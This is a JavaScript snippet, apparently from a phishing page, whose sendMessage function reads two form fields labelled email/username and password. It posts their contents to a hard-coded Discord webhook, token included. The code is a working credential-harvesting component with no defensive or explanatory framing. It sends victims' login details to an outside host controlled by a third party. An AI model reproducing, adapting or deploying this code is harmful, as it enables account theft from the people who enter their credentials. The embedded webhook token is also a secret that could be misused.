function sendMessage() {
    var input1 = document.getElementById("input1").value;
    var input2 = document.getElementById("input2").value;
  
    var data = {
      content: "Email/Username: " + input1 + "\n Password: " + input2
    };
  
    fetch('https://discord.com/api/webhooks/1215877256078164049/x6cxJ-W_hJ5Podi18YGq7SU4vzQiPyjPIUJ2E2rFTl6cxFNcSXZw7jqvshQOeCJ77eLy', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    })
    .then(response => {
      if (!response.ok) {
        console.error('Error sending message to Discord:', response);
      }
    })
    .catch(error => {
      console.error('Error sending message to Discord:', error);
    });
}
